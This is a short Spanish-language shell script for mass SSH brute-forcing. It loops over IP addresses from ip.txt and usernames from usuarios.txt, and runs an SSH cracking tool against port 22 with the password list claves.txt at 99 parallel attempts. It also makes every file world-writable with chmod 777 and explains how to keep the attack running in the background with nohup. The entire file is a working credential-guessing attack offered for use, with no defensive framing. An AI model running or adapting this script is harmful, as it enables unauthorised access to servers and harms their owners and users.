#!/bin/sh
echo
echo "##################################################################"
echo "ssh masivo a IPs en fichero ip.txt"
chmod 777 *
echo "Para mantener como proceso ejecutar: nohup ./brutesshmasivo.sh &"
echo "Uso.: ./brutesshmasivo.sh "
echo "##################################################################"
for i in `cat ip.txt`; do echo $i "<=== IP ";
for u in `cat usuarios.txt` ; do ssb -p 22 -w claves.txt -c 99 $u@$i;
done
done
